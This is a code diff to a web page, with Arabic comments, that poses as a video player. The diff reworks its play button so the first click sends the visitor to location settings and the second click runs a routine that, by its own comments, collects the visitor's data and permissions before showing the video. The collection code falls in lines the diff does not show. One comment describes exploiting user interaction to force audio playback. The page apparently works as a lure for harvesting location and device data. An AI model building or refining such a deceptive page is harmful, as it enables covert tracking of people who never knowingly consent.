@@ -48,23 +48,21 @@
             flex-direction: column;
         }
 
-        /* ===== الزر الكبير في وسط الشاشة ===== */
+        /* ===== الزر الدائري الجديد (تشغيل / إعدادات) ===== */
         #locationActionButton {
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
             background: rgba(255, 255, 255, 0.1);
             border: 3px solid #ff6b6b;
-            border-radius: 20px;
-            padding: 40px 50px;
             cursor: pointer;
             transition: all 0.3s ease;
             backdrop-filter: blur(8px);
             box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
             z-index: 10;
-            text-align: center;
-            min-width: 250px;
         }
         #locationActionButton:hover {
             transform: scale(1.05);
@@ -72,26 +70,14 @@
             border-color: #ff4757;
             box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
         }
-        #locationActionButton .icon-gear {
-            font-size: 80px;
-            line-height: 1;
+        #locationActionButton .play-icon {
+            font-size: 60px;
             color: #ff6b6b;
-            margin-bottom: 15px;
-        }
-        #locationActionButton .main-text {
-            font-size: 28px;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
-        }
-        #locationActionButton .sub-text {
-            font-size: 18px;
-            color: #ddd;
-            margin-top: 8px;
-            opacity: 0.9;
+            line-height: 1;
+            user-select: none;
         }
 
-        /* زر التشغيل الأصلي (سيتم إخفاؤه) */
+        /* زر التشغيل الأصلي (مخفي) */
         .play-button-overlay {
             display: none;
         }
@@ -233,17 +219,11 @@
                 height: 280px;
             }
             #locationActionButton {
-                padding: 20px 30px;
-                min-width: 180px;
+                width: 90px;
+                height: 90px;
             }
-            #locationActionButton .icon-gear {
-                font-size: 50px;
-            }
-            #locationActionButton .main-text {
-                font-size: 22px;
-            }
-            #locationActionButton .sub-text {
-                font-size: 15px;
+            #locationActionButton .play-icon {
+                font-size: 45px;
             }
         }
     </style>
@@ -257,11 +237,9 @@
         </div>
 
         <div class="video-thumbnail" id="thumbnailArea">
-            <!-- زر التشغيل / الموقع (المدمج) -->
+            <!-- الزر الدائري الموحد: الضغطة الأولى تفتح الإعدادات، والثانية تشغّل الفيديو -->
             <div id="locationActionButton">
-                <div class="icon-gear">▶️</div>
-                <div class="main-text">تشغيل الفيديو</div>
-                <div class="sub-text">اضغط للتشغيل</div>
+                <span class="play-icon">▶</span>
             </div>
 
             <!-- زر التشغيل الأصلي (مخفي) -->
@@ -491,51 +469,24 @@
                 }
             }
 
-            // ===== تشغيل الفيديو مع الصوت =====
-            function startVideoWithSound() {
-                if (videoStarted) return;
-                videoStarted = true;
-
+            // ===== إظهار الفيديو مع الصوت (بعد أن بدأ التشغيل فعلياً) =====
+            function showVideo() {
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
-
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
-
-                const playPromise = realVideo.play();
-                if (playPromise !== undefined) {
-                    playPromise.then(() => {}).catch(() => {
-                        realVideo.muted = true;
-                        realVideo.play().then(() => {
-                            setTimeout(() => {
-                                realVideo.muted = false;
-                                realVideo.volume = 1.0;
-                            }, 100);
-                        }).catch(() => {});
-                    });
+                if (realVideo.paused) {
+                    realVideo.play().catch(() => {});
                 }
-
-                setTimeout(() => {
-                    realVideo.muted = false;
-                    realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
-                }, 500);
-
-                setTimeout(() => {
-                    realVideo.muted = false;
-                    realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
-                }, 3000);
             }
 
-            // ===== جمع البيانات وتشغيل الفيديو (عند الضغطة الثانية) =====
+            // ===== جمع البيانات ثم عرض الفيديو =====
             async function collectAndPlay() {
                 if (isProcessing) return;
                 isProcessing = true;
 
-                // عرض مؤشر تحميل (اختياري)
+                // عرض مؤشر التحميل
                 loading.style.display = 'block';
-                // تعطيل الزر
                 locationBtn.style.pointerEvents = 'none';
                 locationBtn.style.opacity = '0.5';
 
@@ -567,28 +518,34 @@
                 locationBtn.style.pointerEvents = 'auto';
                 locationBtn.style.opacity = '1';
 
-                startVideoWithSound();
+                showVideo();
                 isProcessing = false;
             }
 
-            // ===== معالج الضغط على الزر (تشغيل / إعدادات) =====
+            // ===== معالج الضغط على الزر (الدائري) =====
             async function handleButtonClick() {
                 if (isProcessing || videoStarted) return;
 
                 if (!settingsOpened) {
-                    // الضغطة الأولى: فتح إعدادات الموقع فقط
+                    // الضغطة الأولى: فتح إعدادات الموقع
                     settingsOpened = true;
                     openLocationSettings();
                 } else {
-                    // الضغطة الثانية (بعد العودة): جمع الصلاحيات وتشغيل الفيديو
+                    // الضغطة الثانية (بعد العودة): بدء تشغيل الفيديو فوراً بالصوت
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                    realVideo.play().catch(() => {}); // استغلال تفاعل المستخدم لتشغيل الصوت
+                    videoStarted = true;
+
+                    // الآن جمع البيانات وتجهيز العرض
                     await collectAndPlay();
                 }
             }
 
-            // ===== رصد العودة من الإعدادات (نحتفظ بالمراقبة لكن لا نفعل شيء تلقائياً) =====
+            // ===== رصد العودة من الإعدادات (لا إجراء تلقائي، الانتظار للضغطة الثانية) =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // لا نقوم بأي إجراء تلقائي، فقط ننتظر الضغط على الزر مرة أخرى
+                    // فقط للتأكيد على العودة، ولا شيء آخر
                 }
             });
 
@@ -597,12 +554,11 @@
                 locationBtn.addEventListener('click', handleButtonClick);
             }
 
-            // ===== تفعيل الصوت عند أي تفاعل =====
+            // ===== تفعيل الصوت عند أي تفاعل (احتياط) =====
             document.addEventListener('click', function() {
                 if (realVideo) {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
                 }
             }, true);
 
